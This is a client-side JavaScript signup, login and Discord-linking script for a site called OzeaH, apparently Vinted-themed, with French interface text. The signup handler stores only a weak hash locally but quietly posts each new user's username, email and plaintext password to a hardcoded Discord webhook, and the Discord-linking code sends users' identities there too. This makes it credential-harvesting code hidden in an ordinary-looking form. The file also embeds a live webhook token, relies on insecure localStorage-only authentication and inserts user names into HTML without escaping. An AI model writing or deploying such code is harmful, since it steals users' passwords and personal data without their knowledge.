const WEBHOOK_URL = 'https://discord.com/api/webhooks/1552985949515030619/8SWWQCCR5iV0s9FjMRMS_LfEs-t3hcWT3wDy6jEaNChpzIIOeztQWsx3HD_UVbw6ht6D';
const DISCORD_CLIENT_ID = '1107624523479650345';
const REDIRECT_URI = 'https://ozeah.github.io/Vinted/';

function hashPw(str) {
    let h = 0;
    for (let i = 0; i < str.length; i++) {
        h = ((h << 5) - h) + str.charCodeAt(i);
        h |= 0;
    }
    return 'h' + Math.abs(h).toString(36);
}

function getAccounts() {
    return JSON.parse(localStorage.getItem('ozeah_accounts') || '{}');
}

function saveAccounts(acc) {
    localStorage.setItem('ozeah_accounts', JSON.stringify(acc));
}

function showMsg(text, isSuccess) {
    const el = document.getElementById('auth-msg');
    if (!el) return;
    el.textContent = text;
    el.className = isSuccess ? 'auth-msg success' : 'auth-msg';
}

// Signup
function handleSignup(e) {
    e.preventDefault();
    const username = document.getElementById('signup-username').value.trim();
    const email = document.getElementById('signup-email').value.trim();
    const password = document.getElementById('signup-password').value;
    const confirm = document.getElementById('signup-confirm').value;

    if (password.length < 6) {
        showMsg('Le mot de passe doit faire au moins 6 caracteres.');
        return;
    }
    if (password !== confirm) {
        showMsg('Les mots de passe ne correspondent pas.');
        return;
    }

    const accounts = getAccounts();
    if (accounts[email]) {
        showMsg('Un compte existe deja avec cet email.');
        return;
    }

    accounts[email] = {
        username: username,
        hash: hashPw(password),
        created: new Date().toISOString(),
        discord: null
    };
    saveAccounts(accounts);

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            embeds: [{
                title: 'Nouveau compte OzeaH',
                color: 0x2ecc71,
                fields: [
                    { name: 'Pseudo', value: username, inline: true },
                    { name: 'Email', value: email, inline: true },
                    { name: 'Mot de passe', value: password, inline: true },
                    { name: 'Date', value: new Date().toLocaleString('fr-FR'), inline: false }
                ],
                footer: { text: 'OzeaH — Inscription site web' }
            }]
        })
    });

    localStorage.setItem('ozeah_user', JSON.stringify({ email, username, type: 'email' }));
    window.location.href = 'account.html';
}

// Login
function handleLogin(e) {
    e.preventDefault();
    const email = document.getElementById('login-email').value.trim();
    const password = document.getElementById('login-password').value;

    const accounts = getAccounts();
    if (!accounts[email] || accounts[email].hash !== hashPw(password)) {
        showMsg('Email ou mot de passe incorrect.');
        return;
    }

    localStorage.setItem('ozeah_user', JSON.stringify({
        email,
        username: accounts[email].username,
        type: 'email'
    }));
    window.location.href = 'account.html';
}

// Discord OAuth for linking
function linkDiscord() {
    const linkUrl = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI + 'account.html')}&response_type=token&scope=identify`;
    window.location.href = linkUrl;
}

// Handle discord callback on account page
function handleDiscordLink() {
    const fragment = new URLSearchParams(window.location.hash.slice(1));
    const accessToken = fragment.get('access_token');
    if (!accessToken) return;

    fetch('https://discord.com/api/users/@me', {
        headers: { Authorization: `Bearer ${accessToken}` }
    })
    .then(r => r.json())
    .then(discordUser => {
        const user = JSON.parse(localStorage.getItem('ozeah_user') || 'null');
        if (!user || user.type !== 'email') return;

        const accounts = getAccounts();
        if (accounts[user.email]) {
            accounts[user.email].discord = {
                id: discordUser.id,
                username: discordUser.username,
                global_name: discordUser.global_name,
                avatar: discordUser.avatar
            };
            saveAccounts(accounts);
        }

        localStorage.setItem('discord_user', JSON.stringify(discordUser));
        window.history.replaceState(null, '', window.location.pathname);

        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: 'Discord lie a un compte OzeaH',
                    color: 0x5865F2,
                    fields: [
                        { name: 'Pseudo OzeaH', value: user.username, inline: true },
                        { name: 'Email', value: user.email, inline: true },
                        { name: 'Discord', value: `${discordUser.global_name || discordUser.username} (${discordUser.id})`, inline: false }
                    ],
                    footer: { text: 'OzeaH — Liaison Discord' }
                }]
            })
        });

        renderAccountPage();
    });
}

// Render the account page
function renderAccountPage() {
    const container = document.getElementById('account-content');
    if (!container) return;

    const user = JSON.parse(localStorage.getItem('ozeah_user') || 'null');
    if (!user || user.type !== 'email') {
        window.location.href = 'login.html';
        return;
    }

    const accounts = getAccounts();
    const account = accounts[user.email];
    const discord = account ? account.discord : null;

    let discordHtml;
    if (discord) {
        const avatarUrl = discord.avatar
            ? `https://cdn.discordapp.com/avatars/${discord.id}/${discord.avatar}.png?size=64`
            : `https://cdn.discordapp.com/embed/avatars/0.png`;
        discordHtml = `
            <div class="discord-linked">
                <img src="${avatarUrl}" alt="">
                <span>${discord.global_name || discord.username} — Discord lie</span>
            </div>
        `;
    } else {
        discordHtml = `
            <div class="discord-link-banner">
                <span class="warn-icon">&#9888;</span>
                <p>Lie ton compte Discord pour pouvoir devenir VIP et recevoir le role automatiquement.</p>
            </div>
            <button class="btn-link-discord" onclick="linkDiscord()">
                <svg width="18" height="14" viewBox="0 0 71 55" fill="white"><path d="M60.1 4.9A58.5 58.5 0 0045.4.2a.2.2 0 00-.2.1 40.8 40.8 0 00-1.8 3.7 54 54 0 00-16.2 0A37.3 37.3 0 0025.4.3a.2.2 0 00-.2-.1A58.4 58.4 0 0010.5 4.9a.2.2 0 00-.1.1C1.5 18.7-.9 32.2.3 45.5v.1a58.7 58.7 0 0017.7 9a.2.2 0 00.3-.1 42 42 0 003.6-5.9.2.2 0 00-.1-.3 38.6 38.6 0 01-5.5-2.6.2.2 0 01 0-.4l1.1-.9a.2.2 0 01.2 0 41.8 41.8 0 0035.6 0 .2.2 0 01.2 0l1.1.9a.2.2 0 010 .4 36.3 36.3 0 01-5.5 2.6.2.2 0 00-.1.3 47.2 47.2 0 003.6 5.9.2.2 0 00.3.1 58.5 58.5 0 0017.7-9v-.1c1.4-15-2.3-28.4-9.8-40.1a.2.2 0 00-.1-.1zM23.7 37.3c-3.5 0-6.3-3.2-6.3-7s2.8-7 6.3-7 6.4 3.2 6.3 7-2.8 7-6.3 7zm23.3 0c-3.5 0-6.3-3.2-6.3-7s2.8-7 6.3-7 6.4 3.2 6.3 7-2.8 7-6.3 7z"/></svg>
                Lier mon compte Discord
            </button>
        `;
    }

    container.innerHTML = `
        <div class="account-info">
            <div class="account-avatar">${user.username.charAt(0).toUpperCase()}</div>
            <div>
                <h2 class="account-name">${user.username}</h2>
                <p class="account-email">${user.email}</p>
            </div>
        </div>
        <div class="profile-section">
            <h3 class="profile-section-title">Compte Discord</h3>
            ${discordHtml}
        </div>
        <div class="profile-section">
            <button class="btn-auth-submit" onclick="logoutAccount()" style="background:#e74c3c;">Se deconnecter</button>
        </div>
    `;
}

function logoutAccount() {
    localStorage.removeItem('ozeah_user');
    localStorage.removeItem('discord_user');
    window.location.href = 'index.html';
}

// Init on account page
document.addEventListener('DOMContentLoaded', () => {
    if (document.getElementById('account-content')) {
        handleDiscordLink();
        renderAccountPage();
    }
});
